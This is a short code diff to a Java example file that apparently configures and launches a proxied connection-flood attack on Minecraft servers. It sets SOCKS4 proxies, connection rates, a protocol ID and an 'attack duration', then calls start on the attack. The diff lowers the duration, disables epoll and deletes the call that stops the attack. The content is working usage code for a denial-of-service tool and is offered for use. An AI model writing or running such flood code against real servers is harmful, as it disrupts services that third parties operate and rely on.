@@ -35,17 +35,14 @@ public class AsuraExample {
                 .proxyType(ProxyType.SOCKS4)
                 .delay(100) //in ms
                 .perDelay(10) // connections per delay
-                .duration(100) //attack duration
+                .duration(10) //attack duration
                 .protocolID(760) //miecraft version protocol id
                 .proxyManager(makeProxyManager()) //proxy manager
-                .usingEpoll(true) // gives high performance in linux if true
+                .usingEpoll(false) // gives high performance in linux if true
                 .build();
 
         // start attack
         bootstrap.start();
-
-        // stop attack if u want anytime (before duration)
-        bootstrap.stop();
 
         // u can print or use live updated values in bootstrap
         while (!bootstrap.shouldStop) {
